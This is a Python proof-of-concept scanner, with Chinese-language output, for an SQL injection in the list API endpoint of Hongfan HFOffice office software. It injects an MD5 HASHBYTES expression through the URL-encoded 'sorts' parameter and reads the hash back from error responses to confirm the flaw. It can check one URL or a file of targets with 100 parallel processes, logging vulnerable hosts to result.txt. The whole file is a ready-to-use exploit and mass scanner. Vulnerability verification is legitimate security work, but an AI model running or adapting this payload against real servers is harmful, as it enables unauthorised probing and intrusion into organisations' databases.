import requests,re,argparse,os,sys
from multiprocessing import Pool
requests.packages.urllib3.disable_warnings()

# 定义横幅
def banner():
    banner = '''
██╗  ██╗███████╗ ██████╗ ███████╗███████╗██╗ ██████╗███████╗    ██╗     ██╗███████╗████████╗
██║  ██║██╔════╝██╔═══██╗██╔════╝██╔════╝██║██╔════╝██╔════╝    ██║     ██║██╔════╝╚══██╔══╝
███████║█████╗  ██║   ██║█████╗  █████╗  ██║██║     █████╗      ██║     ██║███████╗   ██║   
██╔══██║██╔══╝  ██║   ██║██╔══╝  ██╔══╝  ██║██║     ██╔══╝      ██║     ██║╚════██║   ██║   
██║  ██║██║     ╚██████╔╝██║     ██║     ██║╚██████╗███████╗    ███████╗██║███████║   ██║   
╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝     ╚═╝     ╚═╝ ╚═════╝╚══════╝    ╚══════╝╚═╝╚══════╝   ╚═╝   
                                                        version:红帆HFOffice                                    
                                                                                                     
'''
    print(banner)

def main():
    banner()

    parser = argparse.ArgumentParser(description="红帆 HFOffice list 存在SQL注入漏洞")

    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace("\n",''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Useag: \n\tpython:{sys.argv[0]} -h")
# 构造poc
def poc(target):
    payload = '/api/switch-value/list?sorts=%5B%7B%22Field%22:%221-CONVERT(VARCHAR(32),%20HASHBYTES(%27MD5%27,%20%271%27),%202);%22%7D%5D&conditions=%5B%5D&_ZQA_ID=4dc296c6c69905a7'
    url = target+payload
    header = {
       "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
        "Upgrade-Insecure-Requests": "1",

    }
    try:
        res1 = requests.get(url=url,headers=header,verify=False,timeout=10)
        if  'C4CA4238A0B923820DCC509A6F75849B' in res1.text and res1.status_code == 400:
            print(f"[+]此url{target}存在漏洞")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n') 
        else:
            print(f"[-]此url{target}不存在漏洞")
    except Exception as e:
        print(f"[*]此url{target}可能存在访问问题，请手工测试"+e)
if __name__ ==  '__main__':
    main()